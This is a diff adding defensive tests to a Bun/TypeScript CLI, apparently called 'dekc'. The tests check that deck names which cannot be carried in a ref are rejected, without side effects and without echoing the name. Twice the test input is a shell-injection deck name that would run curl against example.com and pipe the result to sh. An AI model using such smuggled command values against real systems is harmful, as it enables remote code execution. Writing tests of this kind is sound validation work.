@@ -88,6 +88,21 @@ describe("dekc pack", () => {
     },
   );
 
+  test.serial(
+    "refuses a deck whose name a ref cannot carry, and says what it may hold",
+    async () => {
+      const name = "x`;curl$IFSexample.com|sh;`";
+      await withTempProject({ decks: [{ ...talk, name }] }, async (root) => {
+        const result = await run(["pack", name, "--json"], root);
+        expect(result.exitCode).toBe(1);
+        expect(jsonStdout<{ error: { hint: string } }>(result).error.hint).toContain(
+          "letters, digits, dots, dashes, and underscores",
+        );
+        expect(existsSync(join(root, "decks", name, "dist"))).toBe(false);
+      });
+    },
+  );
+
   test.serial("refuses a ref, which is not the reader's to hand on", async () => {
     await withTempDir(async (inbox) => {
       const pack = await packOf(inbox, talk);
@@ -226,6 +241,37 @@ describe("dekc ref <file>.tgz", () => {
             message: expect.stringContaining("no such file"),
           });
           expect(existsSync(join(root, "packs"))).toBe(false);
+          expect(loadConfig(join(root, "dek.toml")).refs).toBeUndefined();
+        });
+      });
+    },
+  );
+
+  test.serial(
+    "refuses a pack whose deck a ref cannot name, without printing the name",
+    async () => {
+      const name = "x`;curl$IFSexample.com|sh;`";
+      await withTempDir(async (inbox) => {
+        const pack = join(inbox, "talk.tgz");
+        await Bun.write(
+          pack,
+          await new Bun.Archive(
+            { "p/dek.toml": "", [`p/decks/${name}/script.md`]: "---\ntitle: A\n---\n" },
+            { compress: "gzip" },
+          ).bytes(),
+        );
+        await withTempProject(receiver, async (root) => {
+          const result = await run(["ref", pack, "--json"], root);
+          expect(result.exitCode).toBe(1);
+          const { error } = jsonStdout<{ error: { message: string; hint: string } }>(result);
+          expect(error).toMatchObject({
+            message: "the pack's deck has a name a ref cannot carry",
+            hint: expect.stringContaining("letters, digits, dots, dashes, and underscores"),
+          });
+          expect(result.stdout).not.toContain("curl");
+          expect((await run(["ref", pack], root)).stderr).not.toContain("curl");
+          expect(existsSync(join(root, "packs"))).toBe(false);
+          expect(existsSync(join(root, "refs"))).toBe(false);
           expect(loadConfig(join(root, "dek.toml")).refs).toBeUndefined();
         });
       });
